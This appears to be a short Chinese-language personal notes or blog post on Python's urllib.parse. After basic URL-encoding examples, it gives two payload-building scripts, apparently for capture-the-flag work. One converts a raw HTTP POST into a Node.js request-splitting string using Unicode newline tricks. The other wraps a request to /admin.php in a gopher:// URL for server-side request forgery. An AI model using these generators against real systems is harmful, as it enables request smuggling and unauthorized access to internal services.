本来是用来发送http请求的包,好像只用过其中的url编码解码功能 XD

`urllib.parse.quote`和`urllib.parse.unquote`
```python
import urllib.parse

url = "!@#$%^&*()"
print(urllib.parse.quote(url)) # %21%40%23%24%25%5E%26%2A%28%29
expr = "1%2b1" 
print(urllib.parse.unquote(expr)) # 1+1
```

nodejs http拆分攻击 转换脚本

```python
import urllib.parse

data="token=you_will_never_know"
HttpData=\
f'''POST /verify HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(data)}
Cookie: session=s:Ak5NTDJjBKUS4i74HZOB76Y2jq_6mPNK.Dy28XvrnFIRDS/gJ+ACC7zRSJoneT6Kt5Y0elhts09s

{data}
'''

tmp = urllib.parse.quote(HttpData)
tmp = tmp.replace('%0A','\\u{010D}\\u{010A}')
tmp = tmp.replace('%20','\\u{0120}')
tmp = urllib.parse.unquote(tmp)
print(tmp)
```

gopher格式转换脚本:
```python
import urllib.parse

data="username=test&password=test"
HttpData=\
f'''POST /admin.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(data)}

{data}
'''

tmp = urllib.parse.quote(HttpData)
tmp = tmp.replace('%0A','%0D%0A')
print('gopher://127.0.0.1:80/_'+ tmp)
```